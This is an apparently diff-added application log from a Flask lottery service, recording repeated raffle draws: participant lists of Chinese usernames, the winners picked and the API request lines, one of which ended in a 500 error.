+INFO:main:参与名单： ['鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '晴诗-Sveinn', '黑渊a龙夏', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '伯利昂_', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：言曦咕了, kkkkkkkce, 超绝後蚁
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:20:04] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:205.210.31.104 - - [18/Jul/2024 17:20:14] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '热可可200505', '是也泽呀', '云泽会希望运气好一点', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '勇敢的龟龟mzh', '晴诗-Sveinn', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '四爪噬金兽', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '二喵奇']
+INFO:main:中奖者：墨小夜201205, 超绝後蚁, 裟椤mp4
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:20:47] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '山元酯醇', '氪与延迟', '致密的路罐薄膜', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7923633187', 'Diamond_王', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '杭行宇', '晴诗-Sveinn', '浮云苍苟丶', '黑渊a龙夏', '晏枸斜晖', '方箱纸', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '一块冻铁', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '呜呜球球出点货', '戚道江', '来自极北的雪飒', '超市秦轲', '西行寺墨墨子', '三味竹饭', '山夜梓黎', '伯利昂_', '猫切吸果冻', '冬暖山岚', '星宇又饿了', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：晏枸斜晖
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:22:42] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:22:42] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '晴诗-Sveinn', '黑渊a龙夏', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '伯利昂_', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：三凉1124, 是小猪叔, 伯利昂_
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:23:47] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '热可可200505', '是也泽呀', '云泽会希望运气好一点', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '勇敢的龟龟mzh', '晴诗-Sveinn', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '四爪噬金兽', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '二喵奇']
+INFO:main:中奖者：椰青美式好喝好喝, 埃尔不污, Zefolx丶
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:23:53] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '霁青梦铳-', '氧化酚', '氪与延迟', '山元酯醇', '是也泽呀', '1薰ya', '夜宸乄', '乘风破浪_qwq', '晴诗-Sveinn', '晏枸斜晖', '觉对许早苗', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '山谷中的质数', '伽鄒閁', '戚道江', '西行寺墨墨子', '山夜梓黎', '山阴剡溪客', '冬暖山岚', 'X极星', '安东尼赛高', 'WolfeKesentel', '鹿语诉说', '致密的路罐薄膜', '热可可200505', '明夏洛河', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '浮云苍苟丶', '黑渊a龙夏', '给人整无语了咧', '永遠054742022', 'Sigurd_Ara', '三凉1124', '-岚崎-', '二喵喵奇', 'ZemA市民集市', '星宇又饿了', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '停雲馆--', 'kkkkkkkce', '笹旸', '刊刊need', '猫狼森淼', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', '用户7553278814', '勇敢的龟龟mzh', '杭行宇', '方箱纸', '四爪噬金兽', '墨小夜201205', '埃尔不污', 'Rim68145', '来自极北的雪飒', '超市秦轲', '三味竹饭', '猫切吸果冻', 'Xris__', '白韩青', '只想摸鱼fishcat', '東方神狐月', 'ice_BX菌', '锦莹逍泽丶轩', '为这世界献上祝福', '二喵奇', '乌鸫东冬面', '小何宝宝ovo', '用户7923633187', 'Diamond_王', '用户7579686646', '安东尼的指虎', 'WTF这是', '一块冻铁', '聚合果酱', '阿淼淼水水水', '没有脑子的梅林', '用户7933471292', '重生之我是山宝枕边人', '呜呜球球出点货', '裟椤mp4', '是小猪叔', 'kkskshd', '伯利昂_', '滴雾任歌骑冻']
+INFO:main:中奖者：山夜梓黎, 山阴剡溪客, 夜宸乄
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:24:21] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '晴诗-Sveinn', '黑渊a龙夏', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '伯利昂_', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：墨小夜201205, 埃尔不污, Sigurd_Ara
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:24:48] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '热可可200505', '是也泽呀', '云泽会希望运气好一点', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '勇敢的龟龟mzh', '晴诗-Sveinn', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '四爪噬金兽', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '二喵奇']
+INFO:main:中奖者：kkkkkkkce, 小何宝宝ovo, 给人整无语了咧
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:25:13] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '晴诗-Sveinn', '黑渊a龙夏', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '伯利昂_', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：滴雾任歌骑冻, 给人整无语了咧, 安东尼赛高
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:25:48] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '山元酯醇', '氪与延迟', '致密的路罐薄膜', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7923633187', 'Diamond_王', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '杭行宇', '晴诗-Sveinn', '浮云苍苟丶', '黑渊a龙夏', '晏枸斜晖', '方箱纸', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '一块冻铁', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '呜呜球球出点货', '戚道江', '来自极北的雪飒', '超市秦轲', '西行寺墨墨子', '三味竹饭', '山夜梓黎', '伯利昂_', '猫切吸果冻', '冬暖山岚', '星宇又饿了', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：勇敢的龟龟mzh, 裟椤mp4, 锦莹逍泽丶轩
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:26:54] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '霁青梦铳-', '氧化酚', '氪与延迟', '山元酯醇', '是也泽呀', '1薰ya', '夜宸乄', '乘风破浪_qwq', '晴诗-Sveinn', '晏枸斜晖', '觉对许早苗', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '山谷中的质数', '伽鄒閁', '戚道江', '西行寺墨墨子', '山夜梓黎', '山阴剡溪客', '冬暖山岚', 'X极星', '安东尼赛高', 'WolfeKesentel', '鹿语诉说', '致密的路罐薄膜', '热可可200505', '明夏洛河', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '浮云苍苟丶', '黑渊a龙夏', '给人整无语了咧', '永遠054742022', 'Sigurd_Ara', '三凉1124', '-岚崎-', '二喵喵奇', 'ZemA市民集市', '星宇又饿了', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '停雲馆--', 'kkkkkkkce', '笹旸', '刊刊need', '猫狼森淼', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', '用户7553278814', '勇敢的龟龟mzh', '杭行宇', '方箱纸', '四爪噬金兽', '墨小夜201205', '埃尔不污', 'Rim68145', '来自极北的雪飒', '超市秦轲', '三味竹饭', '猫切吸果冻', 'Xris__', '白韩青', '只想摸鱼fishcat', '東方神狐月', 'ice_BX菌', '锦莹逍泽丶轩', '为这世界献上祝福', '二喵奇', '乌鸫东冬面', '小何宝宝ovo', '用户7923633187', 'Diamond_王', '用户7579686646', '安东尼的指虎', 'WTF这是', '一块冻铁', '聚合果酱', '阿淼淼水水水', '没有脑子的梅林', '用户7933471292', '重生之我是山宝枕边人', '呜呜球球出点货', '裟椤mp4', '是小猪叔', 'kkskshd', '伯利昂_', '滴雾任歌骑冻']
+INFO:main:中奖者：rolfo, 晏枸斜晖, 永遠054742022
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:27:43] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '晴诗-Sveinn', '黑渊a龙夏', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '伯利昂_', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：四爪噬金兽, 黑渊a龙夏, 来自极北的雪飒
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:28:29] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '山元酯醇', '氪与延迟', '致密的路罐薄膜', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7923633187', 'Diamond_王', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '杭行宇', '晴诗-Sveinn', '浮云苍苟丶', '黑渊a龙夏', '晏枸斜晖', '方箱纸', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '一块冻铁', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '呜呜球球出点货', '戚道江', '来自极北的雪飒', '超市秦轲', '西行寺墨墨子', '三味竹饭', '山夜梓黎', '伯利昂_', '猫切吸果冻', '冬暖山岚', '星宇又饿了', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：kkskshd, 是小猪叔, 戚道江
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:29:48] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '山元酯醇', '氪与延迟', '致密的路罐薄膜', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7923633187', 'Diamond_王', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '杭行宇', '晴诗-Sveinn', '浮云苍苟丶', '黑渊a龙夏', '晏枸斜晖', '方箱纸', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '一块冻铁', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '呜呜球球出点货', '戚道江', '来自极北的雪飒', '超市秦轲', '西行寺墨墨子', '三味竹饭', '山夜梓黎', '伯利昂_', '猫切吸果冻', '冬暖山岚', '星宇又饿了', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：只想摸鱼fishcat, 一块冻铁, 星宇又饿了
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:31:27] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '山元酯醇', '氪与延迟', '致密的路罐薄膜', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7923633187', 'Diamond_王', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '杭行宇', '晴诗-Sveinn', '浮云苍苟丶', '黑渊a龙夏', '晏枸斜晖', '方箱纸', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '一块冻铁', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '呜呜球球出点货', '戚道江', '来自极北的雪飒', '超市秦轲', '西行寺墨墨子', '三味竹饭', '山夜梓黎', '伯利昂_', '猫切吸果冻', '冬暖山岚', '星宇又饿了', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：给人整无语了咧, 狠狠创了, 这是在干啥原来是我在摆烂
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:33:11] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '山元酯醇', '氪与延迟', '致密的路罐薄膜', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7923633187', 'Diamond_王', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '杭行宇', '晴诗-Sveinn', '浮云苍苟丶', '黑渊a龙夏', '晏枸斜晖', '方箱纸', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '一块冻铁', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '呜呜球球出点货', '戚道江', '来自极北的雪飒', '超市秦轲', '西行寺墨墨子', '三味竹饭', '山夜梓黎', '伯利昂_', '猫切吸果冻', '冬暖山岚', '星宇又饿了', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：墨小夜201205, 伯利昂_, Eltashi13
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:40:11] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '热可可200505', '是也泽呀', '云泽会希望运气好一点', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '勇敢的龟龟mzh', '晴诗-Sveinn', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '四爪噬金兽', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '二喵奇']
+INFO:main:中奖者：云泽会希望运气好一点, 二喵喵奇, 这是在干啥原来是我在摆烂
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:41:38] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['李乔乔11111', '鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '山元酯醇', '氪与延迟', '致密的路罐薄膜', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '狠狠创了', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7923633187', 'Diamond_王', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '杭行宇', '晴诗-Sveinn', '浮云苍苟丶', '黑渊a龙夏', '晏枸斜晖', '方箱纸', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '一块冻铁', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '呜呜球球出点货', '戚道江', '来自极北的雪飒', '超市秦轲', '西行寺墨墨子', '三味竹饭', '山夜梓黎', '伯利昂_', '猫切吸果冻', '冬暖山岚', '星宇又饿了', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：用户7579686646, 给人整无语了咧, 乘风破浪_qwq
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:42:52] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '热可可200505', '是也泽呀', '云泽会希望运气好一点', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '勇敢的龟龟mzh', '晴诗-Sveinn', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '四爪噬金兽', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '二喵奇']
+INFO:main:中奖者：鹿语诉说, 只想摸鱼fishcat, kkskshd
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:44:08] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '霁青梦铳-', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '笹旸', '刊刊need', '热可可200505', '猫狼森淼', '明夏洛河', '是也泽呀', '云泽会希望运气好一点', 'Amy_023312', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '夜宸乄', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '用户7579686646', '乘风破浪_qwq', '勇敢的龟龟mzh', '安东尼的指虎', '晴诗-Sveinn', '黑渊a龙夏', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '秋雨连12', '四爪噬金兽', '山谷中的质数', 'Sigurd_Ara', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '伯利昂_', '安东尼赛高', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '锦莹逍泽丶轩', '咸虎一只', '二喵奇']
+INFO:main:中奖者：Zefolx丶, 热可可200505, 三味竹饭
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:45:51] "POST /api/draw HTTP/1.0" 200 -
